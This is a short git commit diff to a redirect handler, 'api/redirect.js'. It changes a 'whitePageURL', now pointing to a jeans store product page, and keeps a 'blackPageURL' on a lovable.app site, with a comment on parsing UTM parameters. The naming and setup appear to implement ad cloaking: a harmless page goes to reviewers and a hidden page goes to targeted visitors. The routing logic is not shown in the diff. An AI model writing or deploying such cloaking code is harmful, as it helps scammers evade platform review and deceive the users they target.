2918c5f741e539a763482b894987de8f793718fd
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-27 00:03:07 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://mar-nautic.com/tube-cutter-pe-hoses";
+    const whitePageURL = "https://www.perfectjeans.com/collections/women-jeans-skinny/products/women-jeans-skinny-ravens";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
